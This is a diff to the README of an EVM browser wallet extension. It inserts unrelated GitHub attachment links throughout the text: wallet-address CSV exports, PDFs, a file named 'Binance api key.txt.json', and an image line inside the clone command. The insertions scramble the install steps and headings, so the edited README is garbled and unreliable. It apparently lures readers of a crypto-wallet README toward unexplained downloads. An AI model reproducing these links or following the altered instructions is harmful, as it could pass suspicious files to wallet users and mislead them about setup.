@@ -3,6 +3,7 @@
 ### https://wigwam.app
 
 A browser extension Web3 wallet designed for Ethereum, Polygon, BNB Smart Chain, Arbitrum, and all EVM networks. Reliable and secure solution for managing accounts and crypto keys, exploring DeFi, NFTs, and GameFi.
+![banner](https://github.com/user-attachments/assets/cf76ca24-a08a-4511-8ade-edba05a2cb41)
 
 ![Wigwam](./docs/banner.png)
 
@@ -14,13 +15,17 @@ A browser extension Web3 wallet designed for Ethereum, Polygon, BNB Smart Chain,
 - [Useful Scripts](#useful-scripts)
 - [Contributions](#contributions)
 - [Support](#support)
+- [export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv](https://github.com/user-attachments/files/16631578/export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv)
+
 
 ## Features
 
 ### Self-Custodial
+[Böl_20240521_0224.pdf](https://github.com/user-attachments/files/16631639/Bol_20240521_0224.pdf)
 
 - 🤲 User-centric approach - the keys belong to the user and are securely stored on their device, encrypted and inaccessible to anyone else.
 - 🗝 Compatible with hardware wallets like [Ledger](https://www.ledger.com/) for an extra layer of security.
+[export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv](https://github.com/user-attachments/files/16631627/export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv)
 
 ### Security First
 
@@ -49,14 +54,18 @@ A browser extension Web3 wallet designed for Ethereum, Polygon, BNB Smart Chain,
 
 - 🖥️ The user interface is intuitive and user-friendly, making it easy for both newcomers and experienced users to navigate and utilize the wallet's features.
 
-### Offline-first
+### Offline-first[export-https-vscode-dev-github-zxramozx-1722740575.json](https://github.com/user-attachments/files/16631624/export-https-vscode-dev-github-zxramozx-1722740575.json)
+
 
 - 🔌 Adopts an offline-first approach by utilizing a local database as the primary source of data. The app syncs with third-party indexer APIs for enhanced functionality but can operate independently, directly interacting with the blockchain if needed.
 
 ### Manifest V3 Compatibility
 
 - ✅ Fully adapted to the latest browser extension ManifestV3 API, ensuring compatibility with modern standards.
+- [Binance api key.txt.json](https://github.com/user-attachments/files/16631603/Binance.api.key.txt.json)
+
 - 🌙 "Sleep well" feature allows the extension to save resources when not in active use, improving overall performance.
+- ![banner](https://github.com/user-attachments/assets/4c0e9d56-3128-4e56-bd85-d9e842f6fbba)
 
 ### Lightweight
 
@@ -77,6 +86,7 @@ You can also find documentation for specific modules within the source code.
 
 ```bash
 git clone git@github.com:wigwamapp/local-wigwam.git wigwam
+![banner](https://github.com/user-attachments/assets/02d1d570-4af2-4203-b7fa-4e98bba53458)
 ```
 
 ### Install app dependencies
@@ -98,9 +108,14 @@ yarn build:firefox
 ### Add an application to the browser locally
 
 1. Open `chrome://extensions/` in your browser
-2. Enable "Developer mode"
-3. Tap on "Load unpacked"
-4. Select `<your_local_wigwam_repository_dir>/dist/prod/chrome_unpacked`
+2. [Blockpit Example Report - 2024 (1).pdf](https://github.com/user-attachments/files/16631579/Blockpit.Example.Report.-.2024.1.pdf)
+
+3. Enable "Developer mode"
+4. [export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv](https://github.com/user-attachments/files/16631580/export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv)
+
+5. Tap on "Load unpacked"
+6. Select `<your_local_wigwam_repository_dir>/dist/prod/chrome_unpacked`
+[export-token-0x9cdc684179d200ddab42628f3500fadd60322121.csv](https://github.com/user-attachments/files/16631592/export-token-0x9cdc684179d200ddab42628f3500fadd60322121.csv)
 
 ## Useful scripts
 
